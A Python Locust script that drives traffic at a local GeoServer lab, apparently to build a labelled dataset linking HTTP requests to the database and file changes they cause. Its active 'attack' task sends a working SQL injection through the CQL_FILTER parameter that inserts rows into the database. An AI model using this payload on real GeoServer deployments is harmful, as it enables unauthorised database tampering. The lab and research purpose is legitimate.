from locust import HttpUser, task, between, events
from locust.clients import ResponseContextManager
import random
import string  
from loguru import logger  
import os
from itertools import count
import json
import gevent
import io
import re
import time
from playwright.sync_api import sync_playwright
import bs4
from urllib.parse import unquote
from gevent.lock import Semaphore
from lxml import etree as ET

lock = Semaphore()  # Create a semaphore to control concurrent access

data_dir = "/mnt/geoserver/data_dir/"

counter = count(0)  # Counter used to generate unique message IDs
answer_file = os.path.join(os.path.dirname(__file__), "answers.json")  # Log file path
answers = {}
users = [
    {
        "username": "admin",
        "password": "geoserver",
        "id": 1
    },
]
users_crt = []

WORKSPACE = "vulhub"
LAYER = "example"
NAMESPACE = f"{WORKSPACE}:{LAYER}"
SRS = "EPSG:404000"
SLD_CONTENT_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<sld:StyledLayerDescriptor xmlns:sld="http://www.opengis.net/sld"
  xmlns:ogc="http://www.opengis.net/ogc"
  xmlns:gml="http://www.opengis.net/gml"
  version="1.0.0">
  <sld:NamedLayer>
    <sld:Name>{name}</sld:Name>
    <sld:UserStyle>
      <sld:Title>{title}</sld:Title>
      <sld:FeatureTypeStyle/>
    </sld:UserStyle>
  </sld:NamedLayer>
</sld:StyledLayerDescriptor>"""

@events.test_start.add_listener
def on_test_start(environment, **_kwargs):
    def get_headers(url, username, password):  
        with sync_playwright() as p:  
            browser = p.chromium.launch()
            logger.info("Browser launched")
            page = browser.new_page()  
            
            try:  
                # Visit the login page  
                page.goto(f"{url}")  
                
                # Fill and submit the login form  
                page.fill('input[name="username"]', username)  
                page.fill('input[name="password"]', password)  
                page.click('button[type="submit"]') 
                
                logger.info("Login form submitted")
                # Wait for the page to finish loading  
                page.wait_for_load_state('networkidle')  
                logger.info("Page loaded")
                
                cookies = page.context.cookies()
                useragent = page.evaluate("navigator.userAgent")
                
                return cookies, useragent
            finally:  
                browser.close()
    
    # CRSF_TOKEN, COOKIES, USER_AGENT = get_pgadmin_headers("http://localhost:5050", "vulhub@example.com", "vulhub")
    for user in users:
        crt = {}
        crt["COOKIES"], crt["USER_AGENT"] = get_headers("http://localhost:8080/geoserver/web", user["username"], user["password"])
        users_crt.append(crt)
    input("Press Enter to Start the test...")  # Wait for the user to press Enter


def calculate_bytes_sent(method: str, uri: str, request_headers: dict, body: str) -> int:
    """Calculate request byte size"""
    request_line = f"{method} {uri} HTTP/1.1\r\n"
    headers = "".join([f"{key}: {value}\r\n" for key, value in request_headers.items()])
    request = f"{request_line}{headers}\r\n{body}"
    return len(request)


def random_string(length: int = 15):  
    """Generate a random string"""  
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))  


def new_log_entry(response: ResponseContextManager, extra: dict | None = None) -> dict:
    """Create a new log entry""" 
    # print(str(response.request.body) if response.request.body else "")
    # print(response.request.headers)
    try:
        body = json.loads(str(response.request.body)) if response.request.body else {} 
        body = {k: str(v) for k, v in body.items()}  # Convert all values to strings
    except json.JSONDecodeError:
        boundary_match = re.search(r'boundary=(.+?)', response.request.headers.get('Content-Type', ''))
        body = {}

        if boundary_match:
            boundary = boundary_match.group(1)
            # print("boundary:", boundary)
            parts = response.request.body.decode("utf-8").split('--' + boundary)
            for part in parts:
                if 'Content-Disposition' in part:
                    # Extract name
                    name_match = re.search(r'name="([^"]+)"', part)
                    if name_match:
                        name = name_match.group(1)
                        # print("name:", name)
                        if name == 'm1_files[]':
                            # Extract filename
                            filename_match = re.search(r'filename="([^"]+)"', part)
                            if filename_match:
                                body['filename'] = filename_match.group(1)
                        else:
                            # Extract the corresponding value
                            # print(repr(part.split(name)[1]))
                            value_match = re.search(r'\r\n\r\n(.*?)\r\n', part.split(name)[1], re.DOTALL)
                            if value_match:
                                value = value_match.group(1).strip()
                                body[name] = value
        elif "xml" in response.request.body.decode("utf-8"):
            # If the request body contains XML data, use it directly as the body
            body = {"xml": response.request.body.decode("utf-8")}

    if response.request.headers.get("Content-Type") == "application/x-www-form-urlencoded":
        # For form submissions, parse form data
        body = {unquote(k): unquote(v) for k, v in (item.split('=') for item in str(response.request.body).split('&'))}

    if extra:
        for key, value in extra.items():
            body[key] = str(value)  # Convert all values to strings
    if '?' in response.request_meta["name"]:
        query_string = response.request_meta["name"].split('?')[1]
        query_params = query_string.split('&')
        for param in query_params:
            key, value = param.split('=')
            # URL-decode keys and values
            key = unquote(key)
            value = unquote(value)
            body[key] = value
    return {
        "verb": response.request_meta["request_type"],
        "uri": response.request_meta["name"],
        "bytes_sent": calculate_bytes_sent(
            response.request_meta["request_type"],
            response.request_meta["name"],
            response.request.headers,
            str(response.request.body) if response.request.body else "",
        ),
        "num_params": len(body),
        "params": body,
    }


class APIUser(HttpUser):  
    """Define user behavior"""  
    wait_time = between(2, 4)  # Wait time between requests, randomized between 1 and 3 seconds
    trans_id = None  # Initialize transaction ID
    user_index = 0  # User index
        
    def on_start(self):
        try:
            # Log in and obtain the session
            self.user_index = random.randint(0, len(users_crt) - 1)
            COOKIES = users_crt[self.user_index]["COOKIES"]
            USER_AGENT = users_crt[self.user_index]["USER_AGENT"]

            if all([COOKIES, USER_AGENT]):
                for cookie in COOKIES:
                    self.client.cookies.set(cookie['name'], cookie['value'])
                self.client.headers["User-Agent"] = USER_AGENT
            else:
                logger.error("Failed to obtain cookies, or user agent.")
                raise Exception("Failed to obtain cookies, or user agent.")
            self.client.headers["Host"] = "localhost:8080"
            self.client.headers["Origin"] = "http://localhost:8080"

            self.get_random_feature_id()  # Warm up by getting a random feature ID

        except KeyboardInterrupt:
            logger.info("Test interrupted by user")
            raise
        except gevent.Timeout:
            logger.error("Timeout occurred")
            raise
        except Exception as e:
            gevent.sleep(1)
            self.on_start()
    
    # @task
    def create_feature(self):
        """Insert a new Geo feature"""
        name = random_string(10)  # Generate a random name

        xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<wfs:Transaction service="WFS" version="1.0.0"
 xmlns:wfs="http://www.opengis.net/wfs"
 xmlns:gml="http://www.opengis.net/gml"
 xmlns:{WORKSPACE}="http://{WORKSPACE}">
  <wfs:Insert>
    <{WORKSPACE}:{LAYER}>
      <{WORKSPACE}:name>{name}</{WORKSPACE}:name>
    </{WORKSPACE}:{LAYER}>
  </wfs:Insert>
</wfs:Transaction>"""

        x_request_id = str(next(counter))  # Get a unique request ID
        with self.client.post(
            url="/geoserver/wfs",
            data=xml.encode("utf-8"),
            headers={
                "x_request_id": x_request_id,
            },
            params={
                "type": "createFeature",
                "name": name
            },
            catch_response=True
        ) as response:
            entry = new_log_entry(response)
            if "<wfs:SUCCESS/>" in response.text:
                response.success()
                db_statements = [
                    {
                        "type": "INSERT",
                        "table": "example",
                        "columns": {
                            "name": name,
                        },
                        "is_match": True
                    }
                ]
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "db_statements": db_statements,
                    "request_time": time.time(),
                }
            else:
                response.failure(f"Insert failed: {response.status_code}\n{response.text}")
    
    def get_random_feature_id(self):
        """Get a random feature ID"""
        # Feature query request
        xml = f"""<?xml version="1.0" encoding="UTF-8"?>
    <wfs:GetFeature service="WFS" version="1.0.0"
    xmlns:wfs="http://www.opengis.net/wfs"
    xmlns:{WORKSPACE}="http://{WORKSPACE}"
    outputFormat="GML2">
    <wfs:Query typeName="{WORKSPACE}:{LAYER}">
        <ogc:Filter xmlns:ogc="http://www.opengis.net/ogc">
        <ogc:PropertyIsLike wildCard="%" singleChar="_" escapeChar="\\">
            <ogc:PropertyName>name</ogc:PropertyName>
            <ogc:Literal>%</ogc:Literal>
        </ogc:PropertyIsLike>
        </ogc:Filter>
    </wfs:Query>
    </wfs:GetFeature>"""
        
        with self.client.post(
            url="/geoserver/wfs",
            params={
                "type": "getFeature",
            },
            data=xml.encode("utf-8"),
            catch_response=True
        ) as response:
            # logger.debug(f"GetFeature response: {response.text}")
            if "FeatureCollection" not in response.text:
                return None
            
            # Parse XML to get all feature IDs
            try:
                root = ET.fromstring(response.content)
                feature_ids = []
                namespaces = {
                    'wfs': 'http://www.opengis.net/wfs',
                    'gml': 'http://www.opengis.net/gml',
                    'vulhub': 'http://vulhub'  # Add the workspace namespace; use the actual workspace URI here
                }
                features = root.findall('.//gml:featureMember/*[@fid]', namespaces=namespaces)
                for feature in features:
                    fid = feature.attrib.get('fid').split('.')[-1]  # Get feature ID
                    if fid:
                        feature_ids.append(fid)
                # logger.info(f"Found feature IDs: {feature_ids}")
                return random.choice(feature_ids) if feature_ids else None
            except Exception as e:
                print(f"Error parsing feature IDs: {e}")
                return None
    
    # @task
    def delete_feature(self):
        """Delete an existing Geo feature"""
        # Get a random feature ID first
        with lock:  # Ensure only one coroutine performs delete operations
            feature_id = self.get_random_feature_id()
            if not feature_id:
                return  # No deletable feature found
            
            xml = f"""<?xml version="1.0" encoding="UTF-8"?>
        <wfs:Transaction service="WFS" version="1.0.0"
        xmlns:wfs="http://www.opengis.net/wfs"
        xmlns:{WORKSPACE}="http://{WORKSPACE}">
        <wfs:Delete typeName="{WORKSPACE}:{LAYER}">
            <ogc:Filter xmlns:ogc="http://www.opengis.net/ogc">
            <ogc:FeatureId fid="{feature_id}"/>
            </ogc:Filter>
        </wfs:Delete>
        </wfs:Transaction>"""

            x_request_id = str(next(counter))  # Get a unique request ID
            with self.client.post(
                url="/geoserver/wfs",
                data=xml.encode("utf-8"),
                headers={
                    "x_request_id": x_request_id,
                },
                params={
                    "type": "deleteFeature",
                    "feature_id": feature_id
                },
                catch_response=True
            ) as response:
                entry = new_log_entry(response)
                if "<wfs:SUCCESS/>" in response.text:
                    response.success()
                    db_statements = [
                        {
                            "type": "DELETE",
                            "table": "example",
                            "columns": {
                                "fid": feature_id,
                            },
                            "is_match": True
                        }
                    ]
                    answers[str(x_request_id)] = {
                        "http_request": entry,
                        "db_statements": db_statements,
                        "request_time": time.time(),
                    }
                else:
                    response.failure(f"Delete failed: {response.status_code}\n{response.text}")

    # @task
    def update_feature(self):
        """Update an existing Geo feature"""
        # Get a random feature ID
        with lock:  # Ensure only one coroutine performs update operations
            feature_id = self.get_random_feature_id()
            if not feature_id:
                return  # No updatable feature found
            
            # Generate a new name
            new_name = "UPDATED_" + random_string(10)
            
            xml = f"""<?xml version="1.0" encoding="UTF-8"?>
        <wfs:Transaction service="WFS" version="1.0.0"
        xmlns:wfs="http://www.opengis.net/wfs"
        xmlns:{WORKSPACE}="http://{WORKSPACE}">
        <wfs:Update typeName="{WORKSPACE}:{LAYER}">
            <wfs:Property>
            <wfs:Name>name</wfs:Name>
            <wfs:Value>{new_name}</wfs:Value>
            </wfs:Property>
            <ogc:Filter xmlns:ogc="http://www.opengis.net/ogc">
            <ogc:FeatureId fid="{feature_id}"/>
            </ogc:Filter>
        </wfs:Update>
        </wfs:Transaction>"""

            x_request_id = str(next(counter))  # Get a unique request ID
            with self.client.post(
                url="/geoserver/wfs",
                data=xml.encode("utf-8"),
                headers={
                    "x_request_id": x_request_id,
                },
                params={
                    "type": "updateFeature",
                    "feature_id": feature_id,
                },
                catch_response=True
            ) as response:
                entry = new_log_entry(response)
                if "<wfs:SUCCESS/>" in response.text:
                    response.success()
                    db_statements = [
                        {
                            "type": "UPDATE",
                            "table": "example",
                            "columns": {
                                "name": new_name,
                                "fid": feature_id,
                            },
                            "is_match": True
                        }
                    ]
                    answers[str(x_request_id)] = {
                        "http_request": entry,
                        "db_statements": db_statements,
                        "request_time": time.time(),
                    }
                else:
                    response.failure(f"Update failed: {response.status_code}\n{response.text}")

    def get_all_style_names(self):
        """Get all style names from GeoServer"""
        with self.client.get(
            "/geoserver/rest/styles.json",
            headers={"Accept": "application/json"},
            catch_response=True
        ) as response:
            if response.status_code == 200:
                try:
                    # print(f"Get style list: {response.text}")
                    styles = response.json().get("styles", {}).get("style", [])
                    res = [style["name"] for style in styles if "test" in style["name"] or "updated" in style["name"]]
                    # print(f"Style list: {res}")
                    response.success()
                    return res
                except Exception as e:
                    print(f"Failed to parse style list: {e}")
                    return []
            else:
                print(f"Failed to get styles: {response.status_code}")
                response.failure(f"Get styles failed: {response.status_code}\n{response.text}")
                return []

    # @task
    def create_style_file(self):
        """Create a style file and record its name"""
        STYLE_NAME = f"test_{random_string(8)}"
        style_title = f"Auto Style {random_string(8)}"
        sld_body = SLD_CONTENT_TEMPLATE.format(name=STYLE_NAME, title=style_title)
        x_request_id = str(next(counter))

        with self.client.post(
            "/geoserver/rest/styles",
            params={"name": STYLE_NAME},
            data=sld_body.encode("utf-8"),
            headers={
                "Content-Type": "application/vnd.ogc.sld+xml",
                "x_request_id": x_request_id,
            },
            catch_response=True
        ) as response:
            entry = new_log_entry(response)
            if response.status_code == 201:
                response.success()
                fs_operations = [
                    {
                        "operation": "create",
                        "source_path": f"{data_dir}styles/{STYLE_NAME}.sld",
                        "destination_path": None,
                        "is_directory": False
                    },
                    {
                        "operation": "create",
                        "source_path": f"{data_dir}styles/{STYLE_NAME}.sld.*.tmp",
                        "destination_path": None,
                        "is_directory": False
                    },
                    {
                        "operation": "update",
                        "source_path": f"{data_dir}styles/{STYLE_NAME}.sld.*.tmp",
                        "destination_path": None,
                        "is_directory": False
                    },
                    {
                        "operation": "update",
                        "source_path": f"{data_dir}styles/{STYLE_NAME}.sld.*.tmp",
                        "destination_path": None,
                        "is_directory": False
                    },
                    {
                        "operation": "update",
                        "source_path": f"{data_dir}styles/{STYLE_NAME}.sld.*.tmp",
                        "destination_path": None,
                        "is_directory": False
                    },
                    {
                        "operation": "move",
                        "source_path": f"{data_dir}styles/{STYLE_NAME}.sld.*.tmp",
                        "destination_path": f"{data_dir}styles/{STYLE_NAME}.sld",
                        "is_directory": False
                    },
                    {
                        "operation": "create",
                        "source_path": f"{data_dir}styles/{STYLE_NAME}.xml",
                        "destination_path": None,
                        "is_directory": False
                    },
                    {
                        "operation": "create",
                        "source_path": f"{data_dir}styles/{STYLE_NAME}.xml.*.tmp",
                        "destination_path": None,
                        "is_directory": False
                    },
                    {
                        "operation": "update",
                        "source_path": f"{data_dir}styles/{STYLE_NAME}.xml.*.tmp",
                        "destination_path": None,
                        "is_directory": False
                    },
                    {
                        "operation": "move",
                        "source_path": f"{data_dir}styles/{STYLE_NAME}.xml.*.tmp",
                        "destination_path": f"{data_dir}styles/{STYLE_NAME}.xml",
                        "is_directory": False
                    },
                    # {
                    #     "operation": "create",
                    #     "source_path": f"{data_dir}global.xml.*.tmp",
                    #     "destination_path": None,
                    #     "is_directory": False
                    # },
                    # {
                    #     "operation": "update",
                    #     "source_path": f"{data_dir}global.xml.*.tmp",
                    #     "destination_path": None,
                    #     "is_directory": False
                    # },
                    # {
                    #     "operation": "move",
                    #     "source_path": f"{data_dir}global.xml.*.tmp",
                    #     "destination_path": f"{data_dir}global.xml",
                    #     "is_directory": False
                    # },
                    # {
                    #     "operation": "update",
                    #     "source_path": f"{data_dir}logs/geoserver.log",
                    #     "destination_path": None,
                    #     "is_directory": False
                    # }
                ]
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "fs_operations": fs_operations,
                    "request_time": time.time(),
                }
            else:
                response.failure(f"Create style failed: {response.status_code}\n{response.text}")

    # @task
    def update_style_file(self):
        """Update existing style file content"""
        with lock:  # Ensure only one coroutine performs update operations
            styles = self.get_all_style_names()
            if not styles:
                logger.warning("No styles available to update.")
                return
            # Randomly select a style name to update
            STYLE_NAME = random.choice(styles)

            updated_title = "Updated Title " + random_string(6)
            updated_sld = SLD_CONTENT_TEMPLATE.format(name=STYLE_NAME, title=updated_title)
            x_request_id = str(next(counter))

            with self.client.put(
                f"/geoserver/rest/styles/{STYLE_NAME}",
                data=updated_sld.encode("utf-8"),
                headers={
                    "Content-Type": "application/vnd.ogc.sld+xml",
                    "x_request_id": x_request_id,
                },
                catch_response=True
            ) as response:
                entry = new_log_entry(response)
                if response.status_code == 200:
                    response.success()
                    fs_operations = [
                        {
                            "operation": "create",
                            "source_path": f"{data_dir}styles/{STYLE_NAME}.sld.*.tmp",
                            "destination_path": None,
                            "is_directory": False
                        },
                        {
                            "operation": "update",
                            "source_path": f"{data_dir}styles/{STYLE_NAME}.sld.*.tmp",
                            "destination_path": None,
                            "is_directory": False
                        },
                        {
                            "operation": "update",
                            "source_path": f"{data_dir}styles/{STYLE_NAME}.sld.*.tmp",
                            "destination_path": None,
                            "is_directory": False
                        },
                        {
                            "operation": "update",
                            "source_path": f"{data_dir}styles/{STYLE_NAME}.sld.*.tmp",
                            "destination_path": None,
                            "is_directory": False
                        },
                        {
                            "operation": "move",
                            "source_path": f"{data_dir}styles/{STYLE_NAME}.sld.*.tmp",
                            "destination_path": f"{data_dir}styles/{STYLE_NAME}.sld",
                            "is_directory": False
                        },
                        {
                            "operation": "create",
                            "source_path": f"{data_dir}styles/{STYLE_NAME}.xml.*.tmp",
                            "destination_path": None,
                            "is_directory": False
                        },
                        {
                            "operation": "update",
                            "source_path": f"{data_dir}styles/{STYLE_NAME}.xml.*.tmp",
                            "destination_path": None,
                            "is_directory": False
                        },
                        {
                            "operation": "move",
                            "source_path": f"{data_dir}styles/{STYLE_NAME}.xml.*.tmp",
                            "destination_path": f"{data_dir}styles/{STYLE_NAME}.xml",
                            "is_directory": False
                        },
                        # {
                        #     "operation": "create",
                        #     "source_path": f"{data_dir}global.xml.*.tmp",
                        #     "destination_path": None,
                        #     "is_directory": False
                        # },
                        # {
                        #     "operation": "update",
                        #     "source_path": f"{data_dir}global.xml.*.tmp",
                        #     "destination_path": None,
                        #     "is_directory": False
                        # },
                        # {
                        #     "operation": "move",
                        #     "source_path": f"{data_dir}global.xml.*.tmp",
                        #     "destination_path": f"{data_dir}global.xml",
                        #     "is_directory": False
                        # }
                    ]
                    answers[str(x_request_id)] = {
                        "http_request": entry,
                        "fs_operations": fs_operations,
                        "request_time": time.time(),
                    }
                else:
                    response.failure(f"Update style failed: {response.status_code}\n{response.text}")

    # @task
    def delete_style_file(self):
        """Delete a style file"""
        with lock:
            styles = self.get_all_style_names()
            if not styles:
                logger.warning("No styles available to delete.")
                return
            # Randomly select a style name to delete
            STYLE_NAME = random.choice(styles)
            logger.info(f"Deleting style: {STYLE_NAME}")
            x_request_id = str(next(counter))
            with self.client.delete(
                f"/geoserver/rest/styles/{STYLE_NAME}",
                headers={"x_request_id": x_request_id},
                catch_response=True
            ) as response:
                entry = new_log_entry(response)
                if response.status_code == 200:
                    response.success()
                    fs_operations = [
                        {
                            "operation": "delete",
                            "source_path": f"{data_dir}styles/{STYLE_NAME}.xml",
                            "destination_path": None,
                            "is_directory": False
                        },
                        {
                            "operation": "move",
                            "source_path": f"{data_dir}styles/{STYLE_NAME}.sld",
                            "destination_path": f"{data_dir}styles/{STYLE_NAME}.sld.bak",
                            "is_directory": False
                        },
                        # {
                        #     "operation": "create",
                        #     "source_path": f"{data_dir}global.xml.*.tmp",
                        #     "destination_path": None,
                        #     "is_directory": False
                        # },
                        # {
                        #     "operation": "update",
                        #     "source_path": f"{data_dir}global.xml.*.tmp",
                        #     "destination_path": None,
                        #     "is_directory": False
                        # },
                        # {
                        #     "operation": "move",
                        #     "source_path": f"{data_dir}global.xml.*.tmp",
                        #     "destination_path": f"{data_dir}global.xml",
                        #     "is_directory": False
                        # },
                        # {
                        #     "operation": "update",
                        #     "source_path": "/mnt/geoserver/data_dir/logs/geoserver.log",
                        #     "destination_path": None,
                        #     "is_directory": False
                        # }
                    ]
                    answers[str(x_request_id)] = {
                        "http_request": entry,
                        "fs_operations": fs_operations,
                        "request_time": time.time(),
                    }
                else:
                    response.failure(f"Delete style failed: {response.status_code}\n{response.text}")

    @task
    def attack(self):
        x_request_id = str(next(counter))
        name = random_string(15)
        fid = random.randint(0, 1000000)
        with self.client.get(
            "/geoserver/ows",
            params={
                "service": "wfs",
                "version": "1.0.0",
                "request": "GetFeature",
                "typeName": "vulhub:example",
                "CQL_FILTER": f"strStartsWith(name,'x'') = true and 1=1; INSERT INTO example (fid, name) VALUES ({fid}, ''{name}'') -- ') = true"
            },
            headers={
                "x_request_id": x_request_id
            },
            catch_response=True
        ) as response:
            entry = new_log_entry(response)
            if response.status_code == 200:
                response.success()
                db_statements = [
                    {
                        "type": "INSERT",
                        "table": "example",
                        "columns": {
                            "name": name,
                            "fid": fid
                        },
                        "is_match": True
                    }
                ]
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "db_statements": db_statements,
                    "request_time": time.time(),
                }
            else:
                response.failure()


@events.test_stop.add_listener
def on_test_stop(environment, **_kwargs):
    # Write answers to file
    with open(answer_file, "w") as f:
        json.dump(answers, f, indent=4)
    logger.info(f"Answers written to {answer_file}")